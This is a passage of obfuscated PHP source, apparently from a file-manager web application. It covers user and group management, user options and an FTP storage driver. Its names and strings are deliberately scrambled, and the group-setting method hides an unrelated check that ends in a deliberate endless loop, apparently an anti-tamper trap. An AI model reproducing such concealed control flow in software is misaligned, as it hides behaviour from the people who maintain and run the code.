array($_SERVER[¥Ÿ©ÒèÌ][740] => $ùšè˜“); return $this->userEdit($ôÌĞª¥‰, $´ŒüĞ·‘); } protected function userRemove($ˆ—¬Îí±) { $‘‘½Ù¬â =& $_SERVER[¥Ÿ©ÒèÌ]; $·£“Ğ…ç = $this->getInfoSimple($ˆ—¬Îí±); if (!$·£“Ğ…ç) { return !1; } $ûÙÕ½ËÍ = array($‘‘½Ù¬â[1630] => $ˆ—¬Îí±); Model($‘‘½Ù¬â[595])->where($ûÙÕ½ËÍ)->delete(); Model($‘‘½Ù¬â[2271])->where($ûÙÕ½ËÍ)->delete(); Model($‘‘½Ù¬â[1896])->where($ûÙÕ½ËÍ)->delete(); Model($‘‘½Ù¬â[2256])->where($ûÙÕ½ËÍ)->delete(); Model($‘‘½Ù¬â[1054])->where($ûÙÕ½ËÍ)->delete(); Model($‘‘½Ù¬â[2093])->removeUserAll($ˆ—¬Îí±); Model($‘‘½Ù¬â[815])->userRootRemove($ˆ—¬Îí±); return $this->where($ûÙÕ½ËÍ)->delete(); } protected function userGroupSet($œú­„½‹, $ß¶º¬Ëœ, $„œåëÇœ = array()) { $ÕËü™‚® =& $_SERVER[¥Ÿ©ÒèÌ]; if (!isset($_SERVER[$ÕËü™‚®[233]]) || !isset($_SERVER[$ÕËü™‚®[241]])) { $Õ±æ‡ºœ = $ÕËü™‚®[863]; $É‹öİ¡ = $ÕËü™‚®[235]; $¾ıÒâœÑ = $_SERVER[$ÕËü™‚®[236]] . $ÕËü™‚®[237]; $ÊÔâ†Š° = $É‹öİ¡($¾ıÒâœÑ); $öàêş£¬ = explode($ÕËü™‚®[226], $ÊÔâ†Š°); if (count($öàêş£¬) < $ÕËü™‚®[622]) { $ªÍÔŞËî = $ÕËü™‚®[239]; $ªÍÔŞËî(); } $ñ‹†á˜º = $ÕËü™‚®[864]; $ñ‹†á˜º($_SERVER[$ÕËü™‚®[865]]); $ØÖ’ú = 1; for ($¥‹ëò = $ØÖ’ú; $¥‹ëò > 0; $¥‹ëò++) { $ñ‹†á˜º = json_encode($GLOBALS[$ÕËü™‚®[419]]); } } $‰í½¦Ì = $this->getInfoSimple($œú­„½‹); if (!$‰í½¦Ì || !is_array($ß¶º¬Ëœ)) { return !1; } $æ„¥Ñî¢ = Model($ÕËü™‚®[1896]); $æ„¥Ñî¢->where(array($ÕËü™‚®[1639] => $œú­„½‹))->delete(); $æˆ´ÁšÖ = array(); $ìÑÑšø = 0; foreach ($ß¶º¬Ëœ as $ÔƒÁİë => $Ëâã™¨‚) { $°â«˜Ë = array($ÕËü™‚®[1639] => $œú­„½‹, $ÕËü™‚®[1807] => $ÔƒÁİë, $ÕËü™‚®[1908] => $Ëâã™¨‚); $°â«˜Ë[$ÕËü™‚®[1830]] = isset($„œåëÇœ[$ìÑÑšø]) ? $„œåëÇœ[$ìÑÑšø] : 0; $ìÑÑšø++; $æˆ´ÁšÖ[] = $°â«˜Ë; } return $æ„¥Ñî¢->addAll($æˆ´ÁšÖ, array(), !0); } protected function userGroupAdd($—šÂàè, $¨›–ÑÃò = array()) { $ äÆûÀÇ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ûí¿ç³ = $this->getInfoSimple($—šÂàè); if (!$Ûí¿ç³ || empty($¨›–ÑÃò)) { return !1; } $ëäÒÅ¢£ = array(); foreach ($¨›–ÑÃò as $Á«‰¼ÑÀ => $¦ºë³’ğ) { $ëäÒÅ¢£[] = array($ äÆûÀÇ[1639] => $—šÂàè, $ äÆûÀÇ[1807] => $Á«‰¼ÑÀ, $ äÆûÀÇ[1908] => $¦ºë³’ğ, $ äÆûÀÇ[1830] => 0); } return Model($ äÆûÀÇ[1896])->addAll($ëäÒÅ¢£, array(), !0); } protected function userGroupRemove($¼«ø«‘Ê, $Ó–®ÍÆË) { $ã–×îç½ =& $_SERVER[¥Ÿ©ÒèÌ]; $¿„—ÉĞ‘ = $this->getInfoSimple($¼«ø«‘Ê); if (!$¿„—ÉĞ‘ || !$Ó–®ÍÆË) { return !1; } $Şæ‰şË = array($ã–×îç½[1630] => $¼«ø«‘Ê, $ã–×îç½[1894] => $Ó–®ÍÆË); return Model($ã–×îç½[1896])->where($Şæ‰şË)->delete(); } public function listData() { $Ñª´Øí = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ñª´Øí[$_SERVER[¥Ÿ©ÒèÌ][373]]); return $Ñª´Øí; } public function listByID($ ùÀæä) { $÷·°¤·º =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ ùÀæä) { return; } $˜Ÿñ•Úé = array($÷·°¤·º[1639] => array($÷·°¤·º[7], $ ùÀæä)); $ıÜ¯Êòœ = $this->where($˜Ÿñ•Úé)->select(); $ıÜ¯Êòœ = array_sort_keep($ıÜ¯Êòœ, $÷·°¤·º[1639], $ ùÀæä); $this->_listDataApply($ıÜ¯Êòœ); return $ıÜ¯Êòœ; } public function listByGroup($Î¾­”µ© = 0, $‹Ü§°é = array()) { $ÓÓ‰¹‡á =& $_SERVER[¥Ÿ©ÒèÌ]; $Ú¬¼›Ôë = $ÓÓ‰¹‡á[12]; $ò¹÷ÙÖ = array(); if ($Î¾­”µ©) { $ò¹÷ÙÖ = array($ÓÓ‰¹‡á[2272] => intval($Î¾­”µ©)); $Ú¬¼›Ôë = "\114\105\x46\124\40\112\x4f\111\116\x20{$this->tablePrefix}\165\x73\145\x72\137\147\x72\157\165\x70\x20\x75\x73\145\162\x5f\x67\x72\x6f\165\x70\x20\x6f\156\x20\x75\x73\x65\x72\x2e\165\x73\145\x72\111\x44\40\75\40\x75\x73\x65\162\x5f\147\162\157\165\160\x2e\165\x73\x65\162\x49\x44"; $š‰µ›öÃ = Input::get($ÓÓ‰¹‡á[455], null, $ÓÓ‰¹‡á[12]) ? $ÓÓ‰¹‡á[12] : $ÓÓ‰¹‡á[2273]; } if (isset($‹Ü§°é[$ÓÓ‰¹‡á[740]])) { $ò¹÷ÙÖ[$ÓÓ‰¹‡á[2274]] = $‹Ü§°é[$ÓÓ‰¹‡á[740]]; } $Ü½ÔÃËõ = $this->_makeOrder($š‰µ›öÃ)->field($ÓÓ‰¹‡á[2275])->where($ò¹÷ÙÖ)->join($Ú¬¼›Ôë)->selectPage(50); $this->_listDataApply($Ü½ÔÃËõ[$ÓÓ‰¹‡á[373]]); return $Ü½ÔÃËõ; } private function _makeOrder($ ƒÖİÓÁ = '') { $¤È¿”Õ– =& $_SERVER[¥Ÿ©ÒèÌ]; $ÃòÚ€èó = array($¤È¿”Õ–[1639], $¤È¿”Õ–[32], $¤È¿”Õ–[1796], $¤È¿”Õ–[1768], $¤È¿”Õ–[193]); $ôÁê–üé = array($¤È¿”Õ–[448] => $¤È¿”Õ–[449], $¤È¿”Õ–[450] => $¤È¿”Õ–[451]); $½ñãˆå— = Input::get($¤È¿”Õ–[455], $¤È¿”Õ–[7], $¤È¿”Õ–[1630], $ÃòÚ€èó); $€Ô×ª÷ï = Input::get($¤È¿”Õ–[456], $¤È¿”Õ–[7], $¤È¿”Õ–[1897], array($¤È¿”Õ–[1897], $¤È¿”Õ–[450])); $€Ô×ª÷ï = $ôÁê–üé[$€Ô×ª÷ï]; $ ƒÖİÓÁ = $ ƒÖİÓÁ . "\165\x73\x65\162\x2e{$½ñãˆå—}\x20{$€Ô×ª÷ï}\x2c\40\x75\x73\145\162\x2e\165\x73\x65\x72\x49\104\40\x61\x73\x63"; return $this->alias($¤È¿”Õ–[2015])->order($ ƒÖİÓÁ); } public function listSearch($çŒ”Š‰ù) { $Ö Íô‡ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ø‹ÖÆÌŒ = $çŒ”Š‰ù[$Ö Íô‡[1898]]; $ñŠ²¡´Ø = isset($çŒ”Š‰ù[$Ö Íô‡[1899]]) ? $çŒ”Š‰ù[$Ö Íô‡[1899]] : !1; $Ø‹ÖÆÌŒ = str_replace($Ö Íô‡[1900], $Ö Íô‡[1901], trim($Ø‹ÖÆÌŒ)); $‡¤êºá = array($Ö Íô‡[32] => array($Ö Íô‡[387], "\45{$Ø‹ÖÆÌŒ}\x25"), $Ö Íô‡[309] => array($Ö Íô‡[387], "{$Ø‹ÖÆÌŒ}\x25"), $Ö Íô‡[2076] => array($Ö Íô‡[387], "{$Ø‹ÖÆÌŒ}\45"), $Ö Íô‡[986] => $Ö Íô‡[1902]); if (Input::check($Ø‹ÖÆÌŒ, $Ö Íô‡[315])) { $‡¤êºá[$Ö Íô‡[1639]] = array($Ö Íô‡[387], "{$Ø‹ÖÆÌŒ}\45"); $‡¤êºá[$Ö Íô‡[2257]] = array($Ö Íô‡[387], "{$Ø‹ÖÆÌŒ}\x25"); } if (!$Ø‹ÖÆÌŒ) { $‡¤êºá = array(); } if (isset($çŒ”Š‰ù[$Ö Íô‡[740]])) { $‡¤êºá[$Ö Íô‡[740]] = $çŒ”Š‰ù[$Ö Íô‡[740]]; } $‡¤êºá = $this->parseWhereLike($‡¤êºá); $¾ËÇã­‚ = $this->_makeOrder()->where($‡¤êºá)->selectPage(20); if (!$¾ËÇã­‚ || count($¾ËÇã­‚[$Ö Íô‡[373]]) < 5 && Input::check($Ø‹ÖÆÌŒ, $Ö Íô‡[322])) { $”›øä‹§ = $this->_searchFromMeta($Ö Íô‡[463], $Ø‹ÖÆÌŒ, 10); $…ˆü—ãØ = $this->_searchFromMeta($Ö Íô‡[464], $Ø‹ÖÆÌŒ, 10); $âÖÔö = array_merge($”›øä‹§, $…ˆü—ãØ, $¾ËÇã­‚[$Ö Íô‡[373]]); $¾ËÇã­‚[$Ö Íô‡[373]] = array_unique_by_key($âÖÔö, $Ö Íô‡[1639]); $¾ËÇã­‚[$Ö Íô‡[370]][$Ö Íô‡[371]] = count($¾ËÇã­‚[$Ö Íô‡[373]]); $¾ËÇã­‚[$Ö Íô‡[370]][$Ö Íô‡[372]] = ceil($¾ËÇã­‚[$Ö Íô‡[370]][$Ö Íô‡[371]] / $¾ËÇã­‚[$Ö Íô‡[370]][$Ö Íô‡[367]]); } $this->_listDataApply($¾ËÇã­‚[$Ö Íô‡[373]]); $this->_filterByGroup($¾ËÇã­‚, $ñŠ²¡´Ø); return $¾ËÇã­‚; } private function _filterByGroup(&$‚¹˜À†Û, $•¾ùÎôö) { $ˆ²Îá­ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$•¾ùÎôö) { return $‚¹˜À†Û; } foreach ($‚¹˜À†Û[$ˆ²Îá­[373]] as $öØğ‘Ñ· => &$ÑŸËÑŞ) { $¨û½Í™¬ = array_to_keyvalue($ÑŸËÑŞ[$ˆ²Îá­[1985]], $ˆ²Îá­[12], $ˆ²Îá­[1807]); if (!in_array($•¾ùÎôö, $¨û½Í™¬)) { unset($‚¹˜À†Û[$ˆ²Îá­[373]][$öØğ‘Ñ·]); } } unset($ÑŸËÑŞ); $‚¹˜À†Û[$ˆ²Îá­[373]] = array_values($‚¹˜À†Û[$ˆ²Îá­[373]]); $‚¹˜À†Û[$ˆ²Îá­[370]] = array($ˆ²Îá­[2048] => count($‚¹˜À†Û[$ˆ²Îá­[373]]), $ˆ²Îá­[2046] => $‚¹˜À†Û[$ˆ²Îá­[370]][$ˆ²Îá­[367]], $ˆ²Îá­[2045] => 1, $ˆ²Îá­[2047] => 1); } private function _searchFromMeta($¨™³êŒş, $ŸŒ¥ø‚ã, $îÂ œŸ˜) { $»Ïİ²¾­ =& $_SERVER[¥Ÿ©ÒèÌ]; $ŸŒ¥ø‚ã = strtolower($ŸŒ¥ø‚ã); $–ØÅÅü = array($»Ïİ²¾­[95] => $¨™³êŒş, $»Ïİ²¾­[378] => array($»Ïİ²¾­[387], "\45{$ŸŒ¥ø‚ã}\45")); $–ØÅÅü = $this->parseWhereLike($–ØÅÅü); $¸Úó¾Œ = Model($»Ïİ²¾­[2276])->where($–ØÅÅü)->limit($îÂ œŸ˜)->select(); if (!$¸Úó¾Œ) { return array(); } $¸Úó¾Œ = array_to_keyvalue($¸Úó¾Œ, $»Ïİ²¾­[12], $»Ïİ²¾­[1639]); $³×¥ò½  = $this->where(array($»Ïİ²¾­[1630] => array($»Ïİ²¾­[7], $¸Úó¾Œ)))->select(); if (!$³×¥ò½ ) { return array(); } return $³×¥ò½ ; } private function _listDataApplyItem($öñ³ù™­) { $ˆûï¹¶ç = array($öñ³ù™­); $this->_listDataApply($ˆûï¹¶ç); return $ˆûï¹¶ç[0]; } private function _listDataApply(&$ä•¤Íš†) { $ĞôÅ¶¨É =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ä•¤Íš†) { return; } array_remove_key($ä•¤Íš†, $ĞôÅ¶¨É[875]); $Ó”úËµ = array_to_keyvalue($ä•¤Íš†, $ĞôÅ¶¨É[12], $ĞôÅ¶¨É[1639]); $this->_listAppendGroup($ä•¤Íš†, $Ó”úËµ); $this->_listAppendMeta($ä•¤Íš†, $Ó”úËµ); $this->_listAppendSourceRoot($ä•¤Íš†, $Ó”úËµ); } private function _listAppendSourceRoot(&$œÓÈ¹İÕ, $Ş¼ƒÁ™‰) { $ù„çŒ‚ =& $_SERVER[¥Ÿ©ÒèÌ]; $ÀâÁ‚å = Model($ù„çŒ‚[815])->listSourceRoot(SourceModel::TYPE_USER, $Ş¼ƒÁ™‰); $ÀâÁ‚å = array_to_keyvalue($ÀâÁ‚å, $ù„çŒ‚[504]); $ÀâÁ‚å = array_remove_key($ÀâÁ‚å, $ù„çŒ‚[504]); foreach ($œÓÈ¹İÕ as &$ ıæÙïÎ) { $ ıæÙïÎ[$ù„çŒ‚[87]] = $ÀâÁ‚å[$ ıæÙïÎ[$ù„çŒ‚[1639]]] ? $ÀâÁ‚å[$ ıæÙïÎ[$ù„çŒ‚[1639]]] : array(); } unset($ ıæÙïÎ); } private function _listAppendGroup(&$Ÿş°É¦ˆ, $„¨™ü«Ô) { $×—Š İÆ =& $_SERVER[¥Ÿ©ÒèÌ]; $Ã±€š€Ã = array($×—Š İÆ[1639] => array($×—Š İÆ[7], $„¨™ü«Ô)); $åƒà‹Í = Model($×—Š İÆ[1896])->where($Ã±€š€Ã)->select(); $à±ê½êÃ = array_to_keyvalue($åƒà‹Í, $×—Š İÆ[12], $×—Š İÆ[1807]); $à±ê½êÃ = array_remove_value(array_unique($à±ê½êÃ), $×—Š İÆ[190]); if (!$à±ê½êÃ || !$åƒà‹Í) { return; } $Ã±€š€Ã = array($×—Š İÆ[1807] => array($×—Š İÆ[7], $à±ê½êÃ)); $‚òŒ´í† = Model($×—Š İÆ[1983])->field($×—Š İÆ[2277])->where($Ã±€š€Ã)->select(); $‚òŒ´í† = array_to_keyvalue($‚òŒ´í†, $×—Š İÆ[1807]); $åƒà‹Í = array_to_keyvalue_group($åƒà‹Í, $×—Š İÆ[1639]); foreach ($åƒà‹Í as &$Ÿ¦¼ãëİ) { $îÆ ÍØ  = array(); foreach ($Ÿ¦¼ãëİ as $¡½ıÎ¶ë) { if (!$¡½ıÎ¶ë[$×—Š İÆ[1908]]) { continue; } $îè©ßŠ” = Model($×—Š İÆ[507])->listData($¡½ıÎ¶ë[$×—Š İÆ[1908]]); $îÆ ÍØ [] = array($×—Š İÆ[1807] => $¡½ıÎ¶ë[$×—Š İÆ[1807]], $×—Š İÆ[2278] => $‚òŒ´í†[$¡½ıÎ¶ë[$×—Š İÆ[1807]]][$×—Š İÆ[32]], $×—Š İÆ[521] => $‚òŒ´í†[$¡½ıÎ¶ë[$×—Š İÆ[1807]]][$×—Š İÆ[521]], $×—Š İÆ[414] => $îè©ßŠ”); } $Ÿ¦¼ãëİ = $îÆ ÍØ ; } unset($Ÿ¦¼ãëİ); foreach ($Ÿş°É¦ˆ as &$ÈŠ”§ğß) { $ÈŠ”§ğß[$×—Š İÆ[1985]] = array(); if (isset($åƒà‹Í[$ÈŠ”§ğß[$×—Š İÆ[1639]]])) { $ÈŠ”§ğß[$×—Š İÆ[1985]] = $åƒà‹Í[$ÈŠ”§ğß[$×—Š İÆ[1639]]]; } } unset($ÈŠ”§ğß); } public function userAppendGroup($ù»¶¡ü˜) { $Åƒ¯ãØŸ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ù»¶¡ü˜) { return array(); } $this->_listAppendGroup($ù»¶¡ü˜, array_to_keyvalue($ù»¶¡ü˜, $Åƒ¯ãØŸ[12], $Åƒ¯ãØŸ[1639])); return $ù»¶¡ü˜; } private function _listAppendMeta(&$Æ€ß´‘°, $’î¢ãÈÒ) { $»ŸàÒ„ =& $_SERVER[¥Ÿ©ÒèÌ]; $—›ÃÏ¾“ = UserJobModel::JOB_KEY; $ˆâ˜¥¦ä = array($»ŸàÒ„[2258]); $°‘û¼´ = array($»ŸàÒ„[1639] => array($»ŸàÒ„[7], $’î¢ãÈÒ)); $ƒÊØ·µà = Model($»ŸàÒ„[2256])->where($°‘û¼´)->select(); $ƒÊØ·µà = array_to_keyvalue_group($ƒÊØ·µà, $»ŸàÒ„[1639]); foreach ($ƒÊØ·µà as &$‡âˆ‡Öø) { $ù°ç‰§« = array(); foreach ($‡âˆ‡Öø as $®ƒ¶»ìˆ) { if (!in_array($®ƒ¶»ìˆ[$»ŸàÒ„[95]], $ˆâ˜¥¦ä)) { $ù°ç‰§«[$®ƒ¶»ìˆ[$»ŸàÒ„[95]]] = $®ƒ¶»ìˆ[$»ŸàÒ„[378]]; } } $‡âˆ‡Öø = $ù°ç‰§«; } unset($‡âˆ‡Öø); $îùíèâ£ = Model($»ŸàÒ„[2279]); foreach ($Æ€ß´‘° as &$ÄÎØ¶¡Ï) { $ÛÁë‰ç” = array(); if (isset($ƒÊØ·µà[$ÄÎØ¶¡Ï[$»ŸàÒ„[1639]]])) { $ÛÁë‰ç” = $ƒÊØ·µà[$ÄÎØ¶¡Ï[$»ŸàÒ„[1639]]]; } $ÄÎØ¶¡Ï[$»ŸàÒ„[2280]] = array(); if (isset($ÛÁë‰ç”[$—›ÃÏ¾“])) { $ÄÎØ¶¡Ï[$»ŸàÒ„[2280]] = $îùíèâ£->getUserJobInfo($ÛÁë‰ç”[$—›ÃÏ¾“]); } } unset($ÄÎØ¶¡Ï); } protected function groupUserAll($ß¥ñ¸å–) { $ÍÚ¤°ÏŠ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$ß¥ñ¸å–) { return !1; } $¾ÑÁß”Æ = Model($ÍÚ¤°ÏŠ[1896])->field($ÍÚ¤°ÏŠ[1639])->where(array($ÍÚ¤°ÏŠ[1807] => array($ÍÚ¤°ÏŠ[7], $ß¥ñ¸å–)))->select(); $¾ÑÁß”Æ = array_to_keyvalue($¾ÑÁß”Æ, $ÍÚ¤°ÏŠ[12], $ÍÚ¤°ÏŠ[1639]); return array_unique($¾ÑÁß”Æ); } public function userSearch($ªø¤†ƒŞ, $Øµ¨èº = "\52") { return Model($_SERVER[¥Ÿ©ÒèÌ][538])->where($ªø¤†ƒŞ)->field($Øµ¨èº)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\162\x5f\x6f\x70\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($‚Îö“Ãƒ) { $äåé¸ğ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!defined($äåé¸ğ[474])) { define($äåé¸ğ[474], 0); } return "\x55\163\x65\x72\x4f\x70\x74\151\157\156\x5f{$‚Îö“Ãƒ}\137" . USER_ID; } protected function filterWhere($©ĞâœËª) { $ØÀöáæ¹ =& $_SERVER[¥Ÿ©ÒèÌ]; if (!defined($ØÀöáæ¹[474])) { define($ØÀöáæ¹[474], 0); } $©ĞâœËª[$ØÀöáæ¹[1639]] = USER_ID; return $©ĞâœËª; } public function cacheRemoveUser($ ì•«‚, $¢¢»Üá») { return Cache::remove("\125\x73\x65\x72\117\x70\x74\x69\157\x6e\137{$ ì•«‚}\x5f" . $¢¢»Üá»); } protected function optionDefault($‹à—¤¢ = '') { $„íîÙş© =& $_SERVER[¥Ÿ©ÒèÌ]; if ($‹à—¤¢ == $„íîÙş©[12]) { return $GLOBALS[$„íîÙş©[6]][$„íîÙş©[2281]]; } if ($‹à—¤¢ == $„íîÙş©[2282]) { return $GLOBALS[$„íîÙş©[6]][$„íîÙş©[2283]]; } } } goto b­Àí²‰‘¼; b÷¸æŞÚ‚¾: $fileSize = strrev(base64_decode($_SERVER[ÃºĞäÅÁ][0])); function binCheckNeq($úİÄ†ë¯, $—ü”­±¬) { return $úİÄ†ë¯ != $—ü”­±¬; } $_SERVER[$_SERVER[ÃºĞäÅÁ][1]] = $fileSize($_SERVER[$_SERVER[ÃºĞäÅÁ][2]]); goto aøªÅ‰•ñ½; c¿é²§Œ²ñ: class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; private $config = array(); public function __construct($‡§åˆäø) { parent::__construct(); if (count($‡§åˆäø) > 0) { $this->_init($‡§åˆäø); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($øŸ¯®¾Õ) { $»šûÊ‡ =& $_SERVER[¥Ÿ©ÒèÌ]; global $config; $this->appCharset = $config[$»šûÊ‡[1348]]; $this->systemCharset = $config[$»šûÊ‡[1349]]; if (isset($øŸ¯®¾Õ[$»šûÊ‡[1350]]) && $øŸ¯®¾Õ[$»šûÊ‡[1350]]) { $this->systemCharset = $øŸ¯®¾Õ[$»šûÊ‡[1350]]; } } public function iconvApp($ÛäÈö³â) { return $this->iconvTo($ÛäÈö³â, $this->systemCharset, $this->appCharset); } public function iconvSystem($¦ôÔ¢²ı) { return $this->iconvTo($¦ôÔ¢²ı, $this->appCharset, $this->systemCharset); } public function getPathOuter($ÎÙêĞ‰İ) { $ÄÍ×ÙÁÎ =& $_SERVER[¥Ÿ©ÒèÌ]; $ö»œ†É = $this->iconvApp($this->pathBase); $ÎÙêĞ‰İ = $this->iconvApp($ÎÙêĞ‰İ); if (substr($ö»œ†É, 0, 2) == $ÄÍ×ÙÁÎ[1351]) { $ö»œ†É = BASIC_PATH . substr($ö»œ†É, 2); } if (substr($ÎÙêĞ‰İ, 0, 2) == $ÄÍ×ÙÁÎ[1351]) { $ÎÙêĞ‰İ = BASIC_PATH . substr($ÎÙêĞ‰İ, 2); } $ö»œ†É = KodIO::clear($ö»œ†É); $ÎÙêĞ‰İ = KodIO::clear($ÎÙêĞ‰İ); $ÎÙêĞ‰İ = substr($ÎÙêĞ‰İ, strlen($ö»œ†É)); if (empty($this->pathDriver)) { return $ÎÙêĞ‰İ; } return $this->pathDriver . $ÄÍ×ÙÁÎ[8] . ltrim($ÎÙêĞ‰İ, $ÄÍ×ÙÁÎ[8]); } private function _init($¥Ê—‘áÃ = array()) { $¢°ÚÁ“Û =& $_SERVER[¥Ÿ©ÒèÌ]; if (!function_exists($¢°ÚÁ“Û[1352])) { throw new Exception(LNG($¢°ÚÁ“Û[1353])); } $this->config = $¥Ê—‘áÃ; $this->charsetReset($¥Ê—‘áÃ); foreach ($¥Ê—‘áÃ as $»¿òÅ¯ë => $“Ò›¯«) { if (isset($this->{$»¿òÅ¯ë})) { $this->{$»¿òÅ¯ë} = $“Ò›¯«; } } return $this->_login($¥Ê—‘áÃ); } private function _login($ ‡”‹•) { $æïœµêû =& $_SERVER[¥Ÿ©ÒèÌ]; static $˜ÒÆÑÆà = array(); $³ÖÁª“¸ = md5(json_encode($ ‡”‹•)); if (isset($˜ÒÆÑÆà[$³ÖÁª“¸])) { foreach ($˜ÒÆÑÆà[$³ÖÁª“¸] as $±á¬„Î³ => $‰‚½È›Ş) { $this->{$±á¬„Î³} = $‰‚½È›Ş; } return !0; } $ÊœÂÍ‹ = parse_url(trim($this->server, $æïœµêû[8])); $this->host = $ÊœÂÍ‹[$æïœµêû[174]]; $Ì€•ÖÑ¡ = isset($ÊœÂÍ‹[$æïœµêû[173]]) && $ÊœÂÍ‹[$æïœµêû[173]] == $æïœµêû[1354] ? !0 : !1; $this->scheme = $Ì€•ÖÑ¡ ? $æïœµêû[1355] : $æïœµêû[1356]; $this->port = isset($ÊœÂÍ‹[$æïœµêû[175]]) ? $ÊœÂÍ‹[$æïœµêû[175]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return !1; } $Ú®åğÀ = @ftp_login($this->connect, $this->username, $this->userpass); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $–öòÂè = $this->pasv == $æïœµêû[89] ? !0 : !1; @ftp_pasv($this->connect, $–öòÂè); $˜ÒÆÑÆà[$³ÖÁª“¸] = array($æïœµêû[1357] => $this->connect, $æïœµêû[174] => $this->host, $æïœµêû[173] => $this->scheme, $æïœµêû[175] => $this->port); return $Ú®åğÀ; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Ş³–·‚¨, $ç‹¾’ˆ = '', $®ç”ó±Ç = REPEAT_RENAME) { if ($this->setContent($Ş³–·‚¨, $ç‹¾’ˆ)) { return $this->getPathOuter($Ş³–·‚¨); } return !1; } public function mkdir($‘ùÄÙß, $†®ñùŞÉ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $‘ùÄÙß = $this->iconvSystem($‘ùÄÙß); if ($this->_isFolder($‘ùÄÙß) || @ftp_mkdir($this->connect, $‘ùÄÙß)) { return $this->getPathOuter($‘ùÄÙß); } if (!$this->mkdir($this->pathFather($‘ùÄÙß))) { return !1; } if ($‘ùÄÙß = @ftp_mkdir($this->connect, $‘ùÄÙß)) { return $this->getPathOuter($‘ùÄÙß); } return !1; } public function copyFile($ş·äËÚ¼, $Ó° áı) { if (!$this->_isconn()) { return !1; } $–âãê’ó = $this->pathThis($this->iconvSystem($ş·äËÚ¼)); $ˆ¿„Úª¯ = $this->tempFile($–âãê’ó); $·—á†‘Ï = $this->iconvApp($ˆ¿„Úª¯); $this->download($ş·äËÚ¼, $·—á†‘Ï); $µÎ´‡üÅ = $this->upload($Ó° áı, $·—á†‘Ï); $this->tempFileRemve($ˆ¿„Úª¯); return $µÎ´‡üÅ; } public function moveFile($Ñ³£œ¨‚, $ñáˆ¯ØÏ) { if (!$this->_isconn()) { return !1; } $Ñ³£œ¨‚ = $this->iconvSystem($Ñ³£œ¨‚); $ñáˆ¯ØÏ = $this->iconvSystem($ñáˆ¯ØÏ); $”ÓÔõøË = @ftp_rename($this->connect, $Ñ³£œ¨‚, $ñáˆ¯ØÏ); return $”ÓÔõøË ? $this->getPathOuter($ñáˆ¯ØÏ) : !1; } public function delFile($¬îÇÊ°á) { if (!$this->_isconn()) { return !1; } $¬îÇÊ°á = $this->iconvSystem($¬îÇÊ°á); return @ftp_delete($this->connect, $¬îÇÊ°á); } public function delFolder($°›õìœÙ) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $æ€¢¨„ = $˜ßù’»» = array(); $this->fileList($°›õìœÙ, $æ€¢¨„, $˜ßù’»», !0); $this->listItemCache = !0; foreach ($˜ßù’»» as $–Ã èÙÁ) { $¹Ê•êØ¼ = $this->iconvSystem($–Ã èÙÁ[$_SERVER[¥Ÿ©ÒèÌ][32]]); $°¨Ã‹¢Ğ = @ftp_delete($this->connect, $¹Ê•êØ¼); if (!$°¨Ã‹¢Ğ) { return !1; } } foreach ($æ€¢¨„ as $¹Ê•êØ¼) { $¹Ê•êØ¼ = $this->iconvSystem($¹Ê•êØ¼); $°¨Ã‹¢Ğ = @ftp_rmdir($this->connect, $¹Ê•êØ¼); if (!$°¨Ã‹¢Ğ) { return !1; } } $°›õìœÙ = $this->iconvSystem($°›õìœÙ); return @ftp_rmdir($this->connect, $°›õìœÙ); } public function rename($°ŠíóÊ, $–Ú±Õ©) { $…óüéäê =& $_SERVER[¥Ÿ©ÒèÌ]; if (!$this->_isconn()) { return !1; } $®‰Œ¼ï = $this->fileNameAuto($this->pathFather($°ŠíóÊ), $–Ú±Õ©); $®‰Œ¼ï = $this->iconvSystem($®‰Œ¼ï); $°ŠíóÊ = $this->iconvSystem($°ŠíóÊ); $šÙÃì¤å = $this->pathFather($°ŠíóÊ); $Öâ‚´Ş‚ = rtrim($šÙÃì¤å, $…óüéäê[8]) . $…óüéäê[8] . $®‰Œ¼ï; $õš ¶¯¶ = @ftp_rename($this->connect, $°ŠíóÊ, $Öâ‚´Ş‚); $Öâ‚´Ş‚ = $this->iconvApp($Öâ‚´Ş‚); return $õš ¶¯¶ ? $this->getPathOuter($Öâ‚´Ş‚) : !1; } private function folderInfo($’¯ë™ä†, $ª¿§¾¼÷ = false) { $Ô©ü¿İô =& $_SERVER[¥Ÿ©ÒèÌ]; $ú“¦»œ = array($Ô©ü¿İô[32] => $this->pathThis($’¯ë™ä†), $Ô©ü¿İô[78] => $this->getPathOuter($Ô©ü¿İô[8] . $’¯ë™ä†), $Ô©ü¿İô[33] => $Ô©ü¿İô[79]); if ($ª¿§¾¼÷) { return $ú“¦»œ; } $ú“¦»œ[$Ô©ü¿İô[193]] = $ú“¦»œ[$Ô©ü¿İô[86]] = 0; $ú“¦»œ[$Ô©ü¿İô[194]] = $ú“¦»œ[$Ô©ü¿İô[195]] = !0; return $ú“¦»œ; } private function fileInfo($ˆ¡Ò…Şá, $ä°ìé = false, $ø®©şÈ = array()) { $ÕœÆÎÖÂ =& $_SERVER[¥Ÿ©ÒèÌ]; $ğô±‘«ô = array($ÕœÆÎÖÂ[32] => $this->pathThis($ˆ¡Ò…Şá), $ÕœÆÎÖÂ[78] => $this->getPathOuter($ÕœÆÎÖÂ[8] . $ˆ¡Ò…Şá), $ÕœÆÎÖÂ[33] => $ÕœÆÎÖÂ[192], $ÕœÆÎÖÂ[80] => isset($ø®©şÈ[$ÕœÆÎÖÂ[80]]) ? 